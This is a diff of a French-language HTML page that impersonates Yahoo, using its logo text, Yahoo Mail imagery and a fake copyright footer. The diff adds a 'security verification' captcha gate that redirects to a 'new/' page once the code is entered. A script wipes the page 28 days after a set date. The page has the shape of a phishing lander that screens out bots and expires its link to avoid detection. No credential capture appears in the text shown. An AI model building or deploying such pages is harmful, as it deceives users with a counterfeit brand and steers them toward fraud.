@@ -9,7 +9,6 @@
       font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
       background-color: #f5f5f5;
     }
-
     .container {
       max-width: 400px;
       margin: 80px auto;
@@ -18,7 +17,6 @@
       border-radius: 12px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-
     .yahoo-logo {
       text-align: center;
       font-size: 28px;
@@ -26,14 +24,24 @@
       color: #6001d2;
       margin-bottom: 30px;
     }
-
+    .captcha-title {
+      text-align: center;
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 15px;
+    }
+    .captcha-desc {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
+      text-align: center;
+    }
     .captcha-box {
       display: flex;
       align-items: center;
       justify-content: space-between;
       margin-bottom: 20px;
     }
-
     .captcha {
       font-size: 24px;
       font-weight: bold;
@@ -43,16 +51,14 @@
       border-radius: 6px;
       user-select: none;
     }
-
     .captcha-image {
       width: 100px;
       height: 50px;
-      background-image: url('https://s.yimg.com/rz/p/yahoo_mail_en-US_f_p_bestfit_mail.png'); /* Image Yahoo Mail */
+      background-image: url('https://s.yimg.com/rz/p/yahoo_mail_en-US_f_p_bestfit_mail.png');
       background-size: contain;
       background-repeat: no-repeat;
       background-position: center;
     }
-
     input[type="text"] {
       width: 100%;
       padding: 12px;
@@ -61,7 +67,6 @@
       border-radius: 6px;
       margin-bottom: 20px;
     }
-
     button {
       width: 100%;
       background-color: #6001d2;
@@ -72,116 +77,114 @@
       border-radius: 6px;
       cursor: pointer;
     }
-
     .error {
       color: red;
       text-align: center;
       margin-top: 10px;
       display: none;
     }
+    .help-text {
+      font-size: 12px;
+      text-align: center;
+      color: #666;
+      margin-top: 20px;
+    }
+    .footer {
+      font-size: 11px;
+      text-align: center;
+      color: #999;
+      margin-top: 30px;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="yahoo-logo">Yahoo</div>
+    
+    <div class="captcha-title">Vérification de sécurité</div>
+    <div class="captcha-desc">
+      Pour protéger votre compte, veuillez confirmer que vous n’êtes pas un robot en recopiant le code ci-dessous.
+    </div>
 
     <div class="captcha-box">
       <div class="captcha" id="captchaValue">123456</div>
       <div class="captcha-image"></div>
     </div>
 
-    <input type="text" id="captchaInput" placeholder="Entrez le code">
+    <input type="text" id="captchaInput" placeholder="Entrez le code affiché ci-dessus">
     <button onclick="validateCaptcha()">Vérifier</button>
     <div class="error" id="errorMessage">Code incorrect. Veuillez réessayer.</div>
+    
+    <div class="help-text">
+      Besoin d’aide ? Assurez-vous d’entrer le code exactement comme il apparaît.
+    </div>
+    <div class="footer">
+      © 2025 Yahoo - Tous droits réservés
+    </div>
   </div>
 
   <script>
-    // Générer un code à 6 chiffres
     function generateCaptcha() {
       const code = Math.floor(100000 + Math.random() * 900000).toString();
       document.getElementById('captchaValue').textContent = code;
       return code;
     }
-
     let currentCaptcha = generateCaptcha();
-
     function validateCaptcha() {
       const userInput = document.getElementById('captchaInput').value.trim();
       const errorMsg = document.getElementById('errorMessage');
-
       if (userInput === currentCaptcha) {
-        // Redirection vers Yahoo Mail
-		localStorage.setItem("valide","true");
+        localStorage.setItem("valide","true");
         window.location.href = "new/";
       } else {
         errorMsg.style.display = "block";
-        // Régénérer un nouveau captcha
         currentCaptcha = generateCaptcha();
       }
     }
   </script>
   <script>
-// Date de début : 8 juin 2025
-const startDate = new Date('2025-06-12T00:00:00');
-
-// Délai d’expiration en jours
-const expirationDays = 28;
-
-// Vérifie si le lien a expiré
-function isLinkExpired() {
-  const now = new Date();
-  const timeDiff = now - startDate;
-  const daysPassed = timeDiff / (1000 * 60 * 60 * 24);
-  return daysPassed >= expirationDays;
-}
-
-// Affiche un message d’expiration avec style percutant
-function showExpirationMessage() {
-  if (isLinkExpired()) {
-    // Supprimer tout le contenu de la page
-    document.body.innerHTML = '';
-
-    // Créer le conteneur du message
-    const messageDiv = document.createElement('div');
-    messageDiv.innerHTML = `
-      <h1>⚠️ Le lien a expiré</h1>
-      <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
-    `;
-
-    // Style impactant
-    Object.assign(messageDiv.style, {
-      position: 'fixed',
-      top: '0',
-      left: '0',
-      width: '100vw',
-      height: '100vh',
-      display: 'flex',
-      flexDirection: 'column',
-      justifyContent: 'center',
-      alignItems: 'center',
-      backgroundColor: '#1a1a1a',
-      color: '#ff4d4f',
-      fontFamily: 'Segoe UI, Arial, sans-serif',
-      fontSize: '24px',
-      textAlign: 'center',
-      padding: '40px',
-      boxSizing: 'border-box',
-      zIndex: '9999',
-    });
-
-    // Style du titre
-    messageDiv.querySelector('h1').style.fontSize = '36px';
-    messageDiv.querySelector('h1').style.marginBottom = '20px';
-    messageDiv.querySelector('p').style.color = '#ffffff';
-
-    // Afficher sur la page
-    document.body.appendChild(messageDiv);
-  }
-}
-
-// Lancer au chargement de la page
-window.onload = showExpirationMessage;
-</script>
-
+    const startDate = new Date('2025-06-12T00:00:00');
+    const expirationDays = 28;
+    function isLinkExpired() {
+      const now = new Date();
+      const timeDiff = now - startDate;
+      const daysPassed = timeDiff / (1000 * 60 * 60 * 24);
+      return daysPassed >= expirationDays;
+    }
+    function showExpirationMessage() {
+      if (isLinkExpired()) {
+        document.body.innerHTML = '';
+        const messageDiv = document.createElement('div');
+        messageDiv.innerHTML = `
+          <h1>⚠️ Le lien a expiré</h1>
+          <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
+        `;
+        Object.assign(messageDiv.style, {
+          position: 'fixed',
+          top: '0',
+          left: '0',
+          width: '100vw',
+          height: '100vh',
+          display: 'flex',
+          flexDirection: 'column',
+          justifyContent: 'center',
+          alignItems: 'center',
+          backgroundColor: '#1a1a1a',
+          color: '#ff4d4f',
+          fontFamily: 'Segoe UI, Arial, sans-serif',
+          fontSize: '24px',
+          textAlign: 'center',
+          padding: '40px',
+          boxSizing: 'border-box',
+          zIndex: '9999',
+        });
+        messageDiv.querySelector('h1').style.fontSize = '36px';
+        messageDiv.querySelector('h1').style.marginBottom = '20px';
+        messageDiv.querySelector('p').style.color = '#ffffff';
+        document.body.appendChild(messageDiv);
+      }
+    }
+    window.onload = showExpirationMessage;
+  </script>
 </body>
 </html>
